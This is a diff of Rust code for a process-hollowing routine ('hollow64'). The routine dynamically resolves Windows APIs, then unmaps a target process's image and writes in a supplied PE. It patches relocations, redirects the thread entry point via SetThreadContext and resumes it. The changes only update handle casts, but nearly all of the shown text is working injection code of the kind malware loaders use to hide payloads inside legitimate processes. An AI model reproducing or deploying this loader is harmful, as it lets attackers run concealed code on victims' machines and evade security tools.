@@ -141,58 +141,58 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
     
         //Retrieve CreateProcessA address
         let mut function_name: &str = "CreateProcessA\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut CreateProcessA_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut CreateProcessA_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         CreateProcessA = transmute::<_, fnCreateProcessA>(CreateProcessA_p);
 
         //Retrieve NtQueryInformationProcess address
         let mut function_name: &str = "NtQueryInformationProcess\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut NtQueryInformationProcess_p:  usize = GetProcAddress(ntdll_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut NtQueryInformationProcess_p:  usize = GetProcAddress(ntdll_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         NtQueryInformationProcess = transmute::<_, fnNtQueryInformationProcess>(NtQueryInformationProcess_p);
 
         //Retrieve ReadProcessMemory_p address
         let mut function_name: &str = "ReadProcessMemory\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut ReadProcessMemory_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut ReadProcessMemory_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("ReadProcessMemory_p : {}",ReadProcessMemory_p);
         ReadProcessMemory = transmute::<_, fnReadProcessMemory>(ReadProcessMemory_p);
 
         //Retrieve NtUnmapViewOfSection address
         let mut function_name: &str = "NtUnmapViewOfSection\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut NtUnmapViewOfSection_p:  usize = GetProcAddress(ntdll_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut NtUnmapViewOfSection_p:  usize = GetProcAddress(ntdll_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("NtUnmapViewOfSection_p : {}",NtUnmapViewOfSection_p);
         NtUnmapViewOfSection = transmute::<_, fnNtUnmapViewOfSection>(NtUnmapViewOfSection_p);
 
         //Retrieve VirtualAlloc address
         let mut function_name: &str = "VirtualAlloc\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut VirtualAlloc_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut VirtualAlloc_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("VirtualAlloc_p : {}",VirtualAlloc_p);
 
         //Retrieve VirtualAllocEx address
         let mut function_name: &str = "VirtualAllocEx\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut VirtualAllocEx_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut VirtualAllocEx_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("VirtualAllocEx_p : {}",VirtualAllocEx_p);
         VirtualAllocEx = transmute::<_, fnVirtualAllocEx>(VirtualAllocEx_p);
 
         //Retrieve WriteProcessMemory address
         let mut function_name: &str = "WriteProcessMemory\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut WriteProcessMemory_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut WriteProcessMemory_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("WriteProcessMemory_p : {}",WriteProcessMemory_p);
         WriteProcessMemory = transmute::<_, fnWriteProcessMemory>(WriteProcessMemory_p);
 
         //Retrieve GetThreadContext address
         let mut function_name: &str = "GetThreadContext\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut GetThreadContext_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut GetThreadContext_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("GetThreadContext_p : {}",GetThreadContext_p);
         GetThreadContext = transmute::<_, fnGetThreadContext>(GetThreadContext_p);
 
         //Retrieve SetThreadContext address
         let mut function_name: &str = "SetThreadContext\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut SetThreadContext_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut SetThreadContext_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("SetThreadContext_p : {}",SetThreadContext_p);
         SetThreadContext = transmute::<_, fnSetThreadContext>(SetThreadContext_p);
 
         //Retrieve ResumeThread address
         let mut function_name: &str = "ResumeThread\0" ; //GetModuleHandleA excepts a Cstring = null terminated string
-        let mut ResumeThread_p:  usize = GetProcAddress(kernel32_handle as isize, function_name.as_ptr() as *const u8).unwrap() as  _;
+        let mut ResumeThread_p:  usize = GetProcAddress(kernel32_handle as *mut c_void, function_name.as_ptr() as *const u8).unwrap() as  _;
         debug!("ResumeThread_p : {}",ResumeThread_p);
         ResumeThread = transmute::<_, fnResumeThread>(ResumeThread_p);
 
@@ -227,7 +227,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         let mut return_l = 0;
         debug!("MSP lp_process_information.dwProcessId {}",lp_process_information.dwProcessId);
         NtQueryInformationProcess(
-            lp_process_information.hProcess as isize, //ProcessHandle
+            lp_process_information.hProcess as *mut c_void, //ProcessHandle
             process_information_class, //ProcessInformationClass
             &mut process_information as *mut _ as *mut c_void, //ProcessInformation
             std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32, //ProcessInformationLength
@@ -236,7 +236,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         let peb_image_offset = process_information.PebBaseAddress as u64 + 0x10;
         let mut image_base_buffer = [0; std::mem::size_of::<&u8>()]; //create an array of 8 bytes, std::mem::size_of::<&u8>() returns size of reference : 8 bytes
         ReadProcessMemory(
-            lp_process_information.hProcess as isize, //hProcess
+            lp_process_information.hProcess as *mut c_void, //hProcess
             peb_image_offset as *mut c_void, //lpBaseAddress
             image_base_buffer.as_mut_ptr() as *mut c_void, //lpBuffer
             image_base_buffer.len(), //nSize
@@ -251,7 +251,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         // 4. Unmap image from remote process with base address previously retrieved
         info!("4. Unmap image from remote process with base address previously retrieved");
         NtUnmapViewOfSection(
-            lp_process_information.hProcess as isize,
+            lp_process_information.hProcess as *mut c_void,
             remote_pe_base_address_original as *mut c_void
         );
 
@@ -278,7 +278,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         info!("6. Alloc memory in remote process with VirtualAllocEx");
 
         let mut allocated_memory_addr = VirtualAllocEx(
-            lp_process_information.hProcess as isize, //hProcess
+            lp_process_information.hProcess as *mut c_void, //hProcess
             remote_pe_base_address_original as *mut c_void,//lpaddress
             pe_to_inject_size as usize,//dwsize
             MEM_COMMIT | MEM_RESERVE,//flallocationtype
@@ -303,7 +303,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         let sizeofheaders = (*module_nt_headers).OptionalHeader.SizeOfHeaders;
         debug!("headers base address : {:?}",new_dest_image_base_address);
         WriteProcessMemory(
-            lp_process_information.hProcess as isize,//hProcess
+            lp_process_information.hProcess as *mut c_void,//hProcess
             new_dest_image_base_address as *mut c_void,//lpaddress 
             loaded_module_base,//lpBuffer 
             sizeofheaders as usize,//nsize
@@ -339,7 +339,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
                        
             debug!("new_section_VA : {:?}",new_section_VA);
             WriteProcessMemory(
-                lp_process_information.hProcess as isize,//hProcess
+                lp_process_information.hProcess as *mut c_void,//hProcess
                 new_section_VA as *mut c_void,//lpaddress 
                 section_data as *mut c_void,//lpBuffer 
                 section_data_size as usize,//nsize
@@ -374,7 +374,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
             //Read first reloc block via remote process (easier beceause not mapped mapped in current process memory)
             let mut reloc_table_buf = vec![0; reloc_size as usize]; 
             ReadProcessMemory(
-                lp_process_information.hProcess as isize,//hProcess
+                lp_process_information.hProcess as *mut c_void,//hProcess
                 first_entry_va as *mut c_void,//lpBaseAddress
                 reloc_table_buf.as_mut_ptr() as *mut c_void,//lpBuffer
                 (*relocation_directory_IMAGE_DATA_DIRECTORY).Size as usize,//nSize
@@ -407,7 +407,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
                         // Read the original value at the final address
                         let mut original_address: u64 = 0; // Directly use a u32 variable
                         let ogaddress = ReadProcessMemory(
-                            lp_process_information.hProcess as isize,//hProcess
+                            lp_process_information.hProcess as *mut c_void,//hProcess
                             (relocation_block_VA  +  offset as usize) as *mut c_void,//lpBaseAddress
                             &mut original_address as *mut _ as *mut c_void,//lpBuffer
                             std::mem::size_of::<u64>(),//nSize
@@ -419,7 +419,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
                         //Write the fixed address to the final address
                         //write((relocation_block_VA + offset as usize) as *mut usize, fixedaddress as usize);
                         WriteProcessMemory(
-                            lp_process_information.hProcess as isize,//hProcess
+                            lp_process_information.hProcess as *mut c_void,//hProcess
                             (relocation_block_VA + offset as usize) as *mut c_void,//lpaddress 
                             &fixedaddress as *const _ as *const c_void,//lpBuffer 
                             std::mem::size_of::<u64>(),//nsize
@@ -441,7 +441,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
 
         if new_dest_image_base_address as *mut winapi::ctypes::c_void != dest_image_base_address as *mut winapi::ctypes::c_void  {
             WriteProcessMemory(
-                hp as isize,
+                hp as *mut c_void,
                 (dest_image_base_address as u64 + 0x10) as _,
                 new_dest_image_base_address,
                 std::mem::size_of::<*mut c_void>(),
@@ -463,7 +463,7 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         // 13. GetThreadContext on remote process
         info!("13. GetThreadContext on remote process");
         if GetThreadContext(
-            lp_process_information.hThread as isize, 
+            lp_process_information.hThread as *mut c_void, 
             &mut ctx.context) 
         == std::ptr::null_mut() {
             debug!("could not get thread context");
@@ -472,13 +472,13 @@ pub fn hollow64(buf: &mut Vec<u8>, dest: &str) -> Result<()> {
         // 14. Modify RCX which contains entry point value and apply new value with SetThreadContext
         info!("14. Modify RCX which contains entry point value and apply new value with SetThreadContext");
         ctx.context.Rcx = entry_point;
-        if SetThreadContext(lp_process_information.hThread as isize, &mut ctx.context) == std::ptr::null_mut() {
+        if SetThreadContext(lp_process_information.hThread as *mut c_void, &mut ctx.context) == std::ptr::null_mut() {
             debug!("could not set thread context");
         }
 
         // 15. Resume thread
         info!("15. Resume thread");
-        if ResumeThread(lp_process_information.hThread as isize) == std::ptr::null_mut() { //no sens
+        if ResumeThread(lp_process_information.hThread as *mut c_void) == std::ptr::null_mut() { //no sens
             debug!("could not set thread context");
         }
 
